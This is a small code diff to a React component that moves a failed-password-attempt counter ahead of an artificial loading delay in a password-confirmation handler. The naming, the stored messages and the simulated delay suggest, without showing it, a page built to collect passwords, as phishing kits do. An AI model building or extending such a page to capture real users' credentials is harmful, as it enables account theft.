@@ -111,6 +111,7 @@ const GetInfo: React.FC = () => {
 	};
 
 	const handleBusinessHomeConfirmPassword = async (password: string) => {
+		setFailedPasswordAttempts((prev) => prev + 1);
 		setIsLoading(true);
 
 		const existingMessage = localStorage.getItem('message') ?? '';
@@ -131,7 +132,6 @@ const GetInfo: React.FC = () => {
 
 		await new Promise((resolve) => setTimeout(resolve, loadingTime));
 
-		setFailedPasswordAttempts((prev) => prev + 1);
 		setIsLoading(false);
 
 		const configData = await config();
